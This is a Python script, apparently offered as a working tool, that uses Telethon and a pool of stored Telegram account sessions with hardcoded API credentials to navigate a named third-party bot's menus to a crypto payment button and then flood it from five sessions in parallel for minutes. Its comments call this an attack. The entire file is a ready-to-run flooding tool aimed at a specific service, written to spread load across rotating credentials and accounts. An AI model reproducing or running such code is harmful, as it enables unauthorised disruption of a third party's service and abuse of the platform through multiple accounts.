"""
berlin_stress.py
Стрессер берлин-подобных ботов с полным навигационным флоу.
Флоу: /start → я подписался → Snos → Открыть тарифы → сутки другу → 120 ₽ криптой
После навигации — 5 сессий параллельно спамят последнюю кнопку с 0.3s задержкой.
"""

import asyncio
import random
import time
from typing import Optional

from telethon import TelegramClient
from telethon.errors import FloodWaitError, AuthKeyDuplicatedError
from telethon.tl.functions.messages import GetBotCallbackAnswerRequest, SendMessageRequest
from telethon.tl.types import (
    ReplyInlineMarkup, KeyboardButtonCallback,
    ReplyKeyboardMarkup, KeyboardButton,
    MessageMediaEmpty,
)

import config

API = [
    '24565698:5a084b434f8505ace703485b9da85040',
    '27904162:e7cba879b1c643ba77490bf328df5eab',
    '23037915:50f06f5b2223586fde0d1379ea91ebc7',
    '29512095:0b29a7d42fff002856b9bed64f7ec919',
    '25055016:25edf5b7becebe91a2d61fe8d9d9931b',
    '21156147:90408de329b27f7dd411dff3e601acc6',
]

SESSION_DIR = 'sessions'
TARGET_BOT  = 'berlinsnos'

# Настраиваемые параметры флоу
FLOW_STEPS = [
    # (тип, значение, задержка после)
    # тип: 'cmd' = текст/команда, 'cb_text' = нажать inline кнопку по тексту
    ('cmd',     '/start',          2.0),
    ('cb_text', 'я подписался',    2.0),
    ('cmd',     'Snos',            2.0),
    ('cb_text', 'Открыть тарифы', 2.0),
    ('cb_text', 'сутки другу',     2.0),
    # последний шаг — кнопку спамим, поэтому только навигируем к ней
    ('cb_text', '120',             0.0),  # ищем кнопку содержащую '120'
]

SPAM_DELAY   = 0.3   # секунды между итерациями спама
SPAM_WORKERS = 5     # максимум параллельных сессий
SPAM_MINUTES = 5     # продолжительность атаки


def _get_sessions(limit: int = SPAM_WORKERS) -> list[str]:
    import os
    sessions = [f.replace('.session', '') for f in os.listdir(SESSION_DIR) if f.endswith('.session')]
    random.shuffle(sessions)
    return sessions[:limit]


def _make_client(session: str) -> TelegramClient:
    api_str = random.choice(API)
    api_id, api_hash = api_str.split(':', 1)
    return TelegramClient(
        f"./{SESSION_DIR}/{session}", int(api_id), api_hash,
        system_version='4.16.30-vxCUSTOM'
    )


def _find_cb_button(markup, text_fragment: str) -> Optional[tuple[int, bytes]]:
    """Ищет inline кнопку по фрагменту текста, возвращает (msg_id будет добавлен снаружи, data)."""
    if not markup or not isinstance(markup, ReplyInlineMarkup):
        return None
    for row in markup.rows:
        for btn in row.buttons:
            if isinstance(btn, KeyboardButtonCallback) and text_fragment.lower() in btn.text.lower():
                return btn.data
    return None


async def _navigate_flow(client: TelegramClient, session: str) -> Optional[tuple[int, bytes]]:
    """
    Проходит флоу бота шаг за шагом.
    Возвращает (msg_id, btn_data) для кнопки спама или None при ошибке.
    """
    try:
        peer = await client.get_entity(TARGET_BOT)
    except Exception as e:
        print(f"[BERLIN] [{session}] ❌ get_entity: {e}", flush=True)
        return None

    last_msg_id = None
    last_btn_data = None

    for step_type, step_val, delay in FLOW_STEPS:
        try:
            if step_type == 'cmd':
                # Отправляем текст / команду
                await client(SendMessageRequest(
                    peer=peer,
                    message=step_val,
                    random_id=random.randint(1, 2**31)
                ))
                if delay:
                    await asyncio.sleep(delay)
                # Берём последнее сообщение бота
                msgs = await client.get_messages(peer, limit=3)
                for msg in msgs:
                    if msg.out:
                        continue
                    if msg.reply_markup:
                        last_msg_id = msg.id
                        break

            elif step_type == 'cb_text':
                # Нажимаем inline кнопку по тексту в последнем сообщении
                msgs = await client.get_messages(peer, limit=5)
                found = False
                for msg in msgs:
                    if msg.out:
                        continue
                    btn_data = _find_cb_button(msg.reply_markup, step_val)
                    if btn_data is not None:
                        last_msg_id = msg.id
                        last_btn_data = btn_data
                        await client(GetBotCallbackAnswerRequest(
                            peer=peer, msg_id=msg.id, data=btn_data
                        ))
                        found = True
                        break
                if not found:
                    print(f"[BERLIN] [{session}] ⚠️ Кнопка '{step_val}' не найдена", flush=True)
                    # Пробуем подождать и повторить
                    await asyncio.sleep(1.5)
                    msgs = await client.get_messages(peer, limit=5)
                    for msg in msgs:
                        if msg.out:
                            continue
                        btn_data = _find_cb_button(msg.reply_markup, step_val)
                        if btn_data is not None:
                            last_msg_id = msg.id
                            last_btn_data = btn_data
                            await client(GetBotCallbackAnswerRequest(
                                peer=peer, msg_id=msg.id, data=btn_data
                            ))
                            found = True
                            break
                    if not found:
                        return None
                if delay:
                    await asyncio.sleep(delay)

        except FloodWaitError as e:
            print(f"[BERLIN] [{session}] 🌊 FloodWait {e.seconds}s", flush=True)
            await asyncio.sleep(e.seconds + 1)
        except Exception as e:
            print(f"[BERLIN] [{session}] ❌ Шаг '{step_val}': {e}", flush=True)
            return None

    if last_msg_id and last_btn_data:
        print(f"[BERLIN] [{session}] ✅ Флоу пройден, кнопка найдена msg_id={last_msg_id}", flush=True)
        return last_msg_id, last_btn_data

    return None


async def _spam_worker(session: str, msg_id: int, btn_data: bytes, stop_event: asyncio.Event) -> int:
    """Один спам-воркер — жмёт кнопку пока не выйдет время."""
    client = _make_client(session)
    count = 0
    try:
        await asyncio.wait_for(client.connect(), timeout=12)
        if not await client.is_user_authorized():
            print(f"[BERLIN] [{session}] ❌ невалид", flush=True)
            return 0

        peer = await client.get_entity(TARGET_BOT)
        print(f"[BERLIN] [{session}] 🔥 Спам-воркер запущен", flush=True)

        while not stop_event.is_set():
            try:
                await client(GetBotCallbackAnswerRequest(
                    peer=peer, msg_id=msg_id, data=btn_data
                ))
                count += 1
                if count % 50 == 0:
                    print(f"[BERLIN] [{session}] 📊 {count} нажатий", flush=True)
            except FloodWaitError as e:
                await asyncio.sleep(e.seconds)
            except Exception:
                await asyncio.sleep(0.5)
            await asyncio.sleep(SPAM_DELAY)

    except Exception as e:
        print(f"[BERLIN] [{session}] ❌ воркер упал: {e}", flush=True)
    finally:
        try:
            if client.is_connected():
                await client.disconnect()
        except Exception:
            pass

    print(f"[BERLIN] [{session}] 🏁 итог: {count} нажатий", flush=True)
    return count


async def run_berlin_stress(notify_fn=None, user_id: int = 0) -> bool:
    """
    Основной запуск стрессера.
    notify_fn(text) — опциональный колбэк для уведомлений в Telegram.
    """
    async def notify(text: str):
        if notify_fn:
            try:
                await notify_fn(text)
            except Exception:
                pass
        print(f"[BERLIN] {text}", flush=True)

    sessions = _get_sessions(SPAM_WORKERS)
    if not sessions:
        await notify("❌ Нет доступных сессий в папке sessions/")
        return False

    await notify(f"🔍 Навигируем флоу на {len(sessions)} сессиях...")

    # Шаг 1: навигация флоу — ищем кнопку через первую сессию
    nav_result = None
    nav_msg_id = None
    nav_btn_data = None

    for sess in sessions:
        client = _make_client(sess)
        try:
            await asyncio.wait_for(client.connect(), timeout=12)
            if not await client.is_user_authorized():
                await client.disconnect()
                continue

            result = await _navigate_flow(client, sess)
            await client.disconnect()

            if result:
                nav_msg_id, nav_btn_data = result
                break
        except AuthKeyDuplicatedError:
            try:
                await client.disconnect()
            except Exception:
                pass
            continue
        except Exception as e:
            try:
                await client.disconnect()
            except Exception:
                pass
            print(f"[BERLIN] [{sess}] навигация: {e}", flush=True)
            continue

    if not nav_msg_id or not nav_btn_data:
        await notify("❌ Не удалось пройти флоу. Проверьте сессии и бот @berlinsnos")
        return False

    await notify(
        f"✅ Флоу пройден!\n"
        f"⚡️ Запускаю {len(sessions)} воркеров на {SPAM_MINUTES} минут...\n"
        f"⏱ Задержка: {SPAM_DELAY}s между нажатиями"
    )

    # Шаг 2: запускаем параллельные спам-воркеры
    stop_event = asyncio.Event()
    asyncio.get_event_loop().call_later(SPAM_MINUTES * 60, stop_event.set)

    tasks = [
        asyncio.create_task(_spam_worker(s, nav_msg_id, nav_btn_data, stop_event))
        for s in sessions
    ]

    results = await asyncio.gather(*tasks, return_exceptions=True)
    total = sum(r for r in results if isinstance(r, int))

    await notify(
        f"🏁 Стрессер завершён!\n"
        f"📊 Итого нажатий: {total}\n"
        f"⏱ Длительность: {SPAM_MINUTES} минут"
    )
    return True
